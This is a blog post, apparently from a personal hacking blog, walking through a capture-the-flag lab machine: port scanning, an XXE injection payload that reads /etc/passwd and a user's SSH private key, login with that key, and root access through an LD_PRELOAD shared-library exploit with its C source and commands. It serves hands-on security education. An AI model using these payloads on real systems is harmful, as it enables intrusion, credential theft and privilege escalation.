<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="FmF" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="FmF" /> <title> Blogger (Parrot CTF) - FmF </title> <link rel="alternate" href="http://localhost:4000/ParrotCtf-Blogger/" hreflang="en-US" /> <link rel="canonical" href="http://localhost:4000/ParrotCtf-Blogger/" /> <meta name="description" content="This is a personal blog about a hacking and other stuff." /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="Blogger (Parrot CTF) | FmF" /> <meta property="og:title" content="Blogger (Parrot CTF) | FmF" /> <meta property="og:type" content="website" /> <meta property="og:url" content="http://localhost:4000/ParrotCtf-Blogger/" /> <meta property="og:description" content="This is a personal blog about a hacking and other stuff." /> <meta property="og:image" content="http://localhost:4000/ParrotCtf-Blogger/banner.png" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="Blogger (Parrot CTF) | " /> <meta name="twitter:url" content="http://localhost:4000/ParrotCtf-Blogger/" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:description" content="This is a personal blog about a hacking and other stuff." /> <meta name="twitter:image" content="http://localhost:4000/ParrotCtf-Blogger/banner.png" /> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="FmF" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> <!-- for mathjax support --> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">Home</a><a class="menu-link" href="/archive/">Archive</a><a class="menu-link" href="/about/">About</a></a> </div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <div class="tags"> <span itemprop="keywords"> <a class="tag" href="/tags/#unix-linux">UNIX/LINUX</a>, <a class="tag" href="/tags/#parrot-ctf">PARROT CTF</a> </span> </div> <h1 class="header-title" itemprop="headline">Blogger (Parrot CTF)</h1> <div class="post-meta"> <time datetime="2023-08-14T05:00:00+00:00" itemprop="datePublished"> Aug 14, 2023 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">FmF</span> </span> <time hidden datetime="" itemprop="dateModified"> Aug 14, 2023 </time> <span hidden itemprop="publisher" itemtype="Person">FmF</span> <span hidden itemprop="image">/ParrotCtf-Blogger/banner.png</span> <span hidden itemprop="mainEntityOfPage"><p><img src="/ParrotCtf-Blogger/1.png" alt="Pwned, lol" /></p> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <p><img src="/ParrotCtf-Blogger/1.png" alt="Pwned, lol" /></p> <p>ü¶ú <a href="https://parrot-ctfs.com/">Parrot CTFs</a> is an advanced cybersecurity education platform and capture the flag provider. Their goal is to create the most realistic capture the flag challenges and demonstrate real-world attack scenarios.</p> <p>This is a medium difficulty machine that exploits a XXE vulnerability and a dynamic linker hijacking with LD_Preload to gain root privileges.</p> <h2 id="content"> <a href="#content" class="anchor-head"></a> Content: </h2> <ul> <li><a href="#enumeration-">Enumeration</a></li> <li><a href="#xxe-">XXE</a></li> <li><a href="#privilege-escalation-">Privilege escalation</a></li> </ul> <h2 id="enumeration-"> <a href="#enumeration-" class="anchor-head"></a> Enumeration üîé: </h2> <p>We start by using <code class="language-plaintext highlighter-rouge">ping</code> to check the <em>TTL</em> of the machine to determine the OS we are dealing with.</p> <p><img src="/ParrotCtf-Blogger/2.png" /></p> <p>Based on the <em>TTL</em> value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href="https://ostechnix.com/identify-operating-system-ttl-ping/">Identify OS using TTL value</a>.</p> <p>Now, let‚Äôs go with an <code class="language-plaintext highlighter-rouge">nmap</code> scan to view the open ports.</p> <p><code class="language-plaintext highlighter-rouge">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.12 -oN allPorts</code></p> <p><code class="language-plaintext highlighter-rouge">-p-</code> ‚Äì&gt; We are doing a scan against all 65535 ports to search for open ports.</p> <p><code class="language-plaintext highlighter-rouge">--open</code> ‚Äì&gt; It will only report open ports.</p> <p><code class="language-plaintext highlighter-rouge">-sS</code> ‚Äì&gt; It can be performed quickly, scanning thousands of ports per second.</p> <p><code class="language-plaintext highlighter-rouge">--min-rate 5000</code> ‚Äì&gt; It sets the minimum rate of packets sent per second to 5000.</p> <p><code class="language-plaintext highlighter-rouge">-n</code> ‚Äì&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p> <p><code class="language-plaintext highlighter-rouge">-v</code> ‚Äì&gt; It will be verbose in its output.</p> <p><code class="language-plaintext highlighter-rouge">-Pn</code> ‚Äì&gt; This option skips the host discovery stage.</p> <p><code class="language-plaintext highlighter-rouge">-oN</code> ‚Äì&gt; It will save the output in a file called ‚ÄúallPorts‚Äù.</p> <p>We find out the following open ports:</p> <p><img src="/ParrotCtf-Blogger/3.png" /></p> <p>Let‚Äôs take a look at what the page has.</p> <p><img src="/ParrotCtf-Blogger/4.png" /></p> <p>Well, we can‚Äôt see any of the posts because we get a 404 error, but we can see something interesting, a search button.</p> <h2 id="xxe-"> <a href="#xxe-" class="anchor-head"></a> XXE üíâ: </h2> <p>Let‚Äôs take a closer look at sending a request, intercepting it with Burp Suite, and sending the request to Repeater for further analysis.</p> <p><img src="/ParrotCtf-Blogger/5.png" /></p> <p>I tried SQL injection payloads, but they didn‚Äôt work. So, I tried different combinations of other payloads and saw this interesting response.</p> <p><img src="/ParrotCtf-Blogger/6.png" /></p> <p>Basically, our input is being placed as a XML structure, sooo maybe a <a href="https://portswigger.net/web-security/xxe">XXE (XML External Entity)</a> injection?? let‚Äôs check it out.</p> <p>We can search for payloads in <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe">PayloadAllTheThings</a> and I used the clasic XXE to retrieve files.</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="p">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s2">"1.0"</span><span class="p">?</span><span class="o">&gt;&lt;!</span><span class="no">DOCTYPE</span> <span class="n">root</span> <span class="p">[</span><span class="o">&lt;!</span><span class="no">ENTITY</span> <span class="nb">test</span> <span class="no">SYSTEM</span> <span class="s1">'file:///etc/passwd'</span><span class="o">&gt;</span><span class="p">]</span><span class="o">&gt;&lt;</span><span class="n">root</span><span class="o">&gt;&amp;</span><span class="nb">test</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/root&gt;
</span></code></pre></div></div> <p><a>IMPORTANT</a>: You need to url encode the ampersand (<code class="language-plaintext highlighter-rouge">&amp;</code>) cause if you don‚Äôt, it will not work. It should be <code class="language-plaintext highlighter-rouge">%26</code>.</p> <p><img src="/ParrotCtf-Blogger/7.png" /></p> <p>It works, now searching for the word <a><code class="language-plaintext highlighter-rouge">bash</code></a> we can see two users <code class="language-plaintext highlighter-rouge">jimmy</code> and <code class="language-plaintext highlighter-rouge">root</code>.</p> <p>But I and know what?, well we can search for configuration files, the <code class="language-plaintext highlighter-rouge">id_rsa</code> of the user <code class="language-plaintext highlighter-rouge">jimmy</code> (<a>Doesn‚Äôt works</a>), enumerate internal ports and so on‚Ä¶ but let‚Äôs enumerate more the web page.</p> <p>We can do fuzzing to the web page to search for directories with tools like: <code class="language-plaintext highlighter-rouge">gobuster</code>, <code class="language-plaintext highlighter-rouge">wfuzz</code>, <code class="language-plaintext highlighter-rouge">ffuf</code>, <code class="language-plaintext highlighter-rouge">dirsearch</code>‚Ä¶ but I am going to use <code class="language-plaintext highlighter-rouge">dirsearch</code> in this case.</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dirsearch</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.14</span><span class="o">.</span><span class="mf">0.12</span><span class="o">/</span>
</code></pre></div></div> <p>And we found the <code class="language-plaintext highlighter-rouge">/management</code> directory:</p> <p><img src="/ParrotCtf-Blogger/8.png" /></p> <p>We found this note in: <code class="language-plaintext highlighter-rouge">/management/admins/temp</code></p> <p><img src="/ParrotCtf-Blogger/9.png" /></p> <p>We found this other note in: <code class="language-plaintext highlighter-rouge">/management/employees/jimmy</code> the same user that we saw earlier.</p> <p><img src="/ParrotCtf-Blogger/10.png" /></p> <p>A <code class="language-plaintext highlighter-rouge">id_rsa</code> file in <code class="language-plaintext highlighter-rouge">/home/jimmy/ssh/id_rsa.bak</code>?? üò≥, let‚Äôs try to search the file with the XXE vulnerability.</p> <p><img src="/ParrotCtf-Blogger/11.png" /></p> <p>Well with this we can log to the system as the user jimmy with <code class="language-plaintext highlighter-rouge">ssh</code>, copy the id_rsa text of burpsuite, put it in a file and change the permissions of the file to <code class="language-plaintext highlighter-rouge">400</code> with <code class="language-plaintext highlighter-rouge">chmod 400 id_rsa</code>, and now connect with it:</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">id_rsa</span> <span class="n">jimmy</span><span class="err">@</span><span class="mf">10.14</span><span class="o">.</span><span class="mf">0.12</span>
</code></pre></div></div> <p>Now that we are inside the machine you need to do one thing to ensure smooth operation:</p> <ol> <li>-&gt; <code class="language-plaintext highlighter-rouge">export TERM=xterm</code></li> </ol> <p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code>.</p> <p><img src="/ParrotCtf-Blogger/12.png" /></p> <p>Now we can see the flag üéâ.</p> <h2 id="privilege-escalation-"> <a href="#privilege-escalation-" class="anchor-head"></a> Privilege escalation üö©: </h2> <p>We need to enumerate the system to find a way to escalate privileges.</p> <p>One thing I always check first is <code class="language-plaintext highlighter-rouge">sudo -l</code>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user.</p> <p>More info about privilege escalation techniques check <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">here.</a></p> <p><img src="/ParrotCtf-Blogger/13.png" /></p> <p>We can see something interesting: <a><code class="language-plaintext highlighter-rouge">env_keep+=LD_PRELOAD</code></a>.</p> <p>A quick search in Google tells us that we can escalate privileges with it.</p> <p>We can go to <code class="language-plaintext highlighter-rouge">/tmp</code> directory and create a exploit like this:</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#include &lt;stdio.h&gt;</span>
<span class="c1">#include &lt;sys/types.h&gt;</span>
<span class="c1">#include &lt;stdlib.h&gt;</span>
<span class="c1">#include &lt;unistd.h&gt;</span>

<span class="n">void</span> <span class="n">_init</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">unsetenv</span><span class="p">(</span><span class="s2">"LD_PRELOAD"</span><span class="p">);</span>
	<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="nb">system</span><span class="p">(</span><span class="s2">"/bin/bash"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p>Save the file as <code class="language-plaintext highlighter-rouge">whatever.c</code> and to compile it with:</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gcc</span> <span class="o">-</span><span class="n">fPIC</span> <span class="o">-</span><span class="n">shared</span> <span class="o">-</span><span class="n">o</span> <span class="n">whatever</span><span class="p">.</span><span class="nf">so</span> <span class="n">whatever</span><span class="p">.</span><span class="nf">c</span> <span class="o">-</span><span class="n">nostartfiles</span>
</code></pre></div></div> <p>This will create a <code class="language-plaintext highlighter-rouge">whatever.so</code> file that we need it to execute:</p> <div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sudo</span> <span class="no">LD_PRELOAD</span><span class="o">=</span><span class="sr">/tmp/</span><span class="n">whatever</span><span class="p">.</span><span class="nf">so</span> <span class="sr">/usr/</span><span class="n">bin</span><span class="o">/</span><span class="n">ping</span>
</code></pre></div></div> <p>And now we are root :)</p> <p><img src="/ParrotCtf-Blogger/14.png" /></p> <p>Hope you like it and learn something new :)</p> </div> </article> </main> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/ParrotCtf-Brew_Brothers/" > <div class="nav-arrow">Previous</div> <span class="post-title">Brew Brothers (Parrot CTF)</span> </a> </nav> <footer class="footer"> <span class="footer_item">&copy; 2023</span> <small class="footer_copyright"> Made with üíñ by FmF. </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
